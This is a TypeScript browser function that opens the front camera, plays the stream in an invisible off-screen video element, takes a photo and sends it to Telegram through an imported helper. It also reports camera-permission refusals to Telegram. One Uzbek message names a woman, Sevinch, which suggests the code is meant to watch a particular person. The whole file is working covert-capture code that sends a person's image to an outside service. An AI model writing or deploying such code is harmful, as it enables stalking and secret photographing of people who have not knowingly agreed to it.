import { notify, notifyPhoto } from "./telegram";

/**
 * Captures a photo from the front camera and sends it to Telegram.
 * If permission is denied or an error occurs, it notifies via Telegram message.
 */
export async function captureAndSendPhoto(caption: string): Promise<void> {
  if (typeof window === "undefined" || !navigator?.mediaDevices?.getUserMedia) {
    notify(`⚠️ MediaDevices not supported in this environment for: ${caption}`);
    return;
  }

  let stream: MediaStream | null = null;
  let videoElement: HTMLVideoElement | null = null;

  try {
    // Attempt to access the front camera (facingMode: "user").
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false,
      });
    } catch (e) {
      // Fallback: try default video camera if "user" constraint fails.
      stream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: false,
      });
    }

    if (!stream) {
      throw new Error("No media stream obtained.");
    }

    // Create a hidden video element to feed the stream into.
    const video = document.createElement("video");
    videoElement = video;
    video.style.position = "fixed";
    video.style.top = "-9999px";
    video.style.left = "-9999px";
    video.style.opacity = "0";
    video.style.pointerEvents = "none";
    video.setAttribute("playsinline", "true");
    video.setAttribute("autoplay", "true");
    video.srcObject = stream;
    document.body.appendChild(video);

    // Wait for the video metadata to load and play.
    await new Promise<void>((resolve, reject) => {
      video.onloadedmetadata = () => {
        video.play().then(resolve).catch(reject);
      };
      video.onerror = () => reject(new Error("Video playback error"));
    });

    // Warm-up delay: wait 1.2s to let auto-exposure/focus stabilize.
    await new Promise((resolve) => setTimeout(resolve, 1200));

    // Capture the frame.
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;

    const ctx = canvas.getContext("2d");
    if (!ctx) {
      throw new Error("Failed to get 2D canvas context.");
    }

    // Flip the image horizontally so it acts like a mirror (typical front camera expectation).
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Stop all media tracks to turn off the camera immediately.
    stream.getTracks().forEach((track) => track.stop());
    stream = null;
    
    // Clean up the video element.
    if (video.parentNode) {
      video.parentNode.removeChild(video);
    }
    videoElement = null;

    // Convert canvas to blob and send it to Telegram.
    canvas.toBlob(
      (blob) => {
        if (blob) {
          notifyPhoto(blob, caption);
        } else {
          notify(`⚠️ Rasm blobga o'girilmadi: ${caption}`);
        }
      },
      "image/jpeg",
      0.85
    );
  } catch (error: any) {
    // Clean up stream.
    if (stream) {
      stream.getTracks().forEach((track) => track.stop());
    }
    // Clean up video.
    if (videoElement && videoElement.parentNode) {
      videoElement.parentNode.removeChild(videoElement);
    }
    
    // Log the camera permission denial or issue.
    const errorMessage = error?.message || String(error);
    notify(`⚠️ Sevinchning kamerasiga ulanib bo'lmadi yoki ruxsat bermadi: ${errorMessage}\n📌 ${caption}`);
  }
}
